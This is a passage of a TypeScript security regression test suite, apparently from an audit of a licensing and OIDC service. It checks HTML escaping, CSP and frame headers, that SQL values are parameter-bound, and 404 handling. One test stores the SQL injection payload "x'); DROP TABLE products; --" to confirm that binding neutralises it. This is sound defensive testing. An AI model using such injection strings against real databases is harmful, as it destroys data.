    const repoSrc = readFileSync(
      join(HERE, "..", "..", "src", "repo.ts"),
      "utf8",
    );
    // The only INSERT that touches the column hardcodes NULL.
    expect(repoSrc).toContain("ttl_seconds, audience, auth_page_template)");
    expect(repoSrc).toContain("VALUES (?, ?, ?, ?, ?, ?, ?, ?, NULL)");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-12 — escapeHtml omits `'`; verify every interpolation is safe today
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-12 escapeHtml coverage", () => {
  it('REFUTED (today): the device-verify page escapes `<>&"` and every sink is a text node or a double-quoted attr', () => {
    const src = readFileSync(join(HERE, "..", "..", "src", "oidc.ts"), "utf8");
    expect(src).toContain('.replace(/"/g, "&quot;")');
    expect(src).not.toContain("&#39;");
    // CHANGED by the R8-02 fix: confirmation is no longer a bare `<a href>` GET link. It is
    // now a POST form carrying a CSRF token, so a GET can neither mutate the flow nor leak
    // `state` via the Location header. Assert the escaping invariant on the new markup —
    // both attribute interpolations remain double-quoted and escapeHtml-wrapped.
    expect(src).toContain(
      '<form method="post" action="${escapeHtml(url.toString())}">',
    );
    expect(src).toContain('name="csrf" value="${escapeHtml(csrf)}"');
  });

  it("REFUTED (today): portal email escapes into a double-quoted href / text node", () => {
    const src = readFileSync(
      join(HERE, "..", "..", "src", "portal", "email.ts"),
      "utf8",
    );
    expect(src).toContain('<a href="${escapeHtml(link)}">');
    expect(src).toContain('<p>${escapeHtml(text).replace(/\\n/g, "<br>")}</p>');
  });

  it("the device-verify HTML page ships with no headers of its own — the dispatcher backstop adds them", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await kv.put(
      `p:${SLUG}:device-flow:DC`,
      JSON.stringify({
        state: "s",
        deviceId: "dev-1",
        userCode: "ABCD-1234",
        authorizeUrl: "https://id.example/authorize",
        deviceName: "Ada's Mac",
      }),
    );
    const { handleAuthDeviceVerify } = await import("../../src/oidc.js");
    const res = await handleAuthDeviceVerify(
      req(`https://key.plrs.im/${SLUG}/auth/device/verify?device_code=DC`),
      env,
      makeProduct(),
    );
    expect(res.status).toBe(200);
    const html = await res.text();
    // The apostrophe survives escapeHtml — harmless in a text node, but it is the
    // reason this helper must never be reused in a single-quoted attribute.
    expect(html).toContain("Ada's Mac");
    // FIXED at the handler — `oidc.ts` now adopts `staticHtmlSecurityHeaders` directly, so
    // the page is hardened even when the handler is called without the dispatcher.
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
    // FIXED (R1-09) at the dispatcher: index.ts pipes every response through
    // `secureResponse`, which supplies a CSP to any HTML response that lacks one. That
    // apostrophe is why `style-src 'unsafe-inline'` is the only inline allowance in the
    // static policy — scripts stay fully blocked by `default-src 'none'`.
    const { secureResponse } = await import("../../src/securityHeaders.js");
    const served = secureResponse(
      new Response(html, {
        status: 200,
        headers: { "content-type": "text/html; charset=utf-8" },
      }) as unknown as Response,
    );
    expect(served.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(served.headers.get("x-frame-options")).toBe("DENY");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-13 — SQL: dynamic SET clauses (REFUTED as exploitable today)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-13 dynamic `SET ${col} = ?` builders", () => {
  it("REFUTED: every key reaching updateProduct/patchLicense is a hardcoded literal", () => {
    const products = readFileSync(
      join(HERE, "..", "..", "src", "admin", "handlers", "products.ts"),
      "utf8",
    );
    const licenses = readFileSync(
      join(HERE, "..", "..", "src", "admin", "handlers", "licenses.ts"),
      "utf8",
    );
    // No spread of request data into the field object at either call site.
    expect(products).not.toMatch(/updateProduct\(\s*db,\s*slug,\s*\{\s*\.\.\./);
    expect(licenses).not.toMatch(
      /patchLicense\(\s*db,\s*slug,\s*id,\s*\{\s*\.\.\./,
    );
    expect(products).toContain('name: typeof body.name === "string"');
  });

  it("values are always bound, never interpolated (D1Db + SqliteDb both bind)", async () => {
    const db = makeTestDb();
    await seedProduct(db, SLUG);
    const evil = "x'); DROP TABLE products; --";
    await db.run("UPDATE products SET name = ? WHERE slug = ?", evil, SLUG);
    const row = await db.first<{ name: string }>(
      "SELECT name FROM products WHERE slug = ?",
      SLUG,
    );
    expect(row?.name).toBe(evil);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-14 — handleRelease's NotFoundError -> 404 mapping is dead (async return-in-try)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-14 handleRelease try/catch never catches", () => {
  it("a missing release REJECTS instead of returning the documented clean 404", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db);
    await seedGhToken(env);
    const { fetchImpl } = recordingFetchImpl([]); // no releases at all

    // FIXED (R9-14 / R6-08): every branch is now `return harden(await handler(...))`
    // inside the try, so `NotFoundError` reaches the catch and maps to the documented
    // clean 404 instead of escaping as an unhandled rejection (500).
    const res = await handleRelease(
      req(`https://key.plrs.im/${SLUG}/version`),
      env,
      db,
      makeProduct(),
      "version",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
  });

  it("only the synchronous `install` branch and the `!cfg` guard return a real 404", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG); // no release_config row
    const { fetchImpl } = recordingFetchImpl([]);
    const res = await handleRelease(
      req(`https://key.plrs.im/${SLUG}/version`),
      env,
      db,
      makeProduct(),
      "version",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
  });
});
